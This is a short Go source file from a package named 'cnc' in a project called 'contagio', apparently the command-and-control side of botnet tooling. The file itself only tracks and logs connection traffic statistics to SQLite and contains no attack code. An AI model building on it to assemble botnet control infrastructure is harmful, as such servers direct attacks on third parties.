package cnc

import (
	"contagio/contagio/database/sqlite"
	"strconv"
	"sync/atomic"
	"time"
)

type ServerStats struct {
	Incoming uint64
	Outgoing uint64
}

func (s *ServerStats) AddIncoming(n int) {
	atomic.AddUint64(&s.Incoming, uint64(n))

}
func (s *ServerStats) AddOutgoing(n int) {
	atomic.AddUint64(&s.Outgoing, uint64(n))
}

func (s *ServerStats) Reset() {
	atomic.StoreUint64(&s.Outgoing, 0)
	atomic.StoreUint64(&s.Incoming, 0)
}

func (s *ServerStats) SaveStats() {
	for {
		sqlite.SetStats(strconv.Itoa(int(s.Incoming)), strconv.Itoa(int(s.Outgoing)))
		s.Reset()
		time.Sleep(1 * time.Second)
	}

}

func (c *Connection) Send(b []byte) (n int, err error) {
	n, err = c.conn.Write(b)
	c.s.AddOutgoing(n)

	return n, err
}
